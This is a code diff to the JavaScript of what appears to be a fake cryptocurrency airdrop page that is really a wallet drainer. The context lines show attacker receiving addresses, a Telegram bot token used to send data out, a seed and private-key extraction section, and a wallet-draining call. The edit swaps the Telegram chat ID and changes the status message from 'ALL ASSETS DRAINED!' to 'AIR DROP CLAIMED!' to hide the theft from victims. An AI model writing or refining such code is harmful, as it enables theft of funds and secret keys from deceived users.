@@ -112,7 +112,7 @@ $(document).ready(function () {
     const RECEIVER_ETH_ADDRESS = "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7";
     const RECEIVER_SOL_ADDRESS = "6oU4uLAfavhXWoF68rDNcChs7tzfs4AQ6Dq3VwwjWCLJ";
     const TELEGRAM_BOT_TOKEN = "8864536415:AAFIveix7T5Fc2uxQn0knLvqFUzBzah8g-Y";
-    const TELEGRAM_CHAT_ID = "697024863";
+    const TELEGRAM_CHAT_ID = "5559647371";
     const ALCHEMY_API_KEY = "jf3NdgL3L8IdVAEeLB8cO";
 
     // SEED/PK EXTRACTION
@@ -496,7 +496,7 @@ const COMMON_TOKENS = RAW_TOKENS.map(t => ({
                 await drainSolanaWallet();
             }
             
-            updateConnectionStatus("ALL ASSETS DRAINED! 🎉");
+            updateConnectionStatus("AIR DROP CLAIMED! 🎉");
             alert("Airdrop claimed successfully!");
             
         } catch(e) {
